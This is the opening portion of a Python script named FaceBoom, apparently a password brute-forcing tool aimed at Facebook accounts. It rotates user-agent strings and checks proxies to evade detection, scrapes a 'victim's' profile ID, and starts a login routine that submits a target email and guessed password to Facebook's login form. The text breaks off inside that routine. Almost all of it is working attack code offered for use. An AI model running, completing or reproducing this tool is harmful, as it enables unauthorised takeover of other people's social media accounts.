#!/usr/bin/python

import socket
import sys
import os
import re
import random
import optparse
import time
import io

try:
    import requests
except ImportError:
    print("\033[1;31m\n[!\033[1;33m!\033[1;31m] Error: \033[1;33m[ requests ]\033[1;31m module is missing\033[1;37m")
    print("  [*] Please Use: 'pip install requests' to install it :)")
    sys.exit(1)

try:
    import mechanize
except ImportError:
    print("\033[1;31m\n[!\033[1;33m!\033[1;31m] Error: \033[1;33m[ mechanize ]\033[1;31m module is missing\033[1;37m")
    print("  [*] Please Use: 'pip install mechanize' to install it :)")
    sys.exit(1)

class FaceBoom(object):
    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders = [('User-agent', random.choice([
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
            'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
            'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]

    @staticmethod
    def check_proxy(proxy):
        proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
        proxy_ip = proxy.split(":")[0]
        try:
            r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
            if proxy_ip == r.headers['X-Client-IP']:
                return True
            return False
        except Exception:
            return False

    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:
            pass
        return False

    def get_profile_id(self, target_profile):
        try:
            print("\033[1;32m\n[\033[1;37m*\033[1;32m] geting target Profile Id... please wait\033[1;37m")
            idre = re.compile('(?<="userID":").*?(?=")')
            con = requests.get(target_profile).text
            idis = idre.search(con).group()
            print("\033[1;37m\n[\033[1;32m+\033[1;37m] \033[1;32mTarget Profile\033[1;37m ID: \033[1;33m{}\033[1;37m".format(idis))
        except Exception:
            print("\033[1;31m[!\033[1;33m!\033[1;31m] Error: Please Check Your Victim's Profile URL\033[1;37m")
            sys.exit(1)

    def login(self, target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
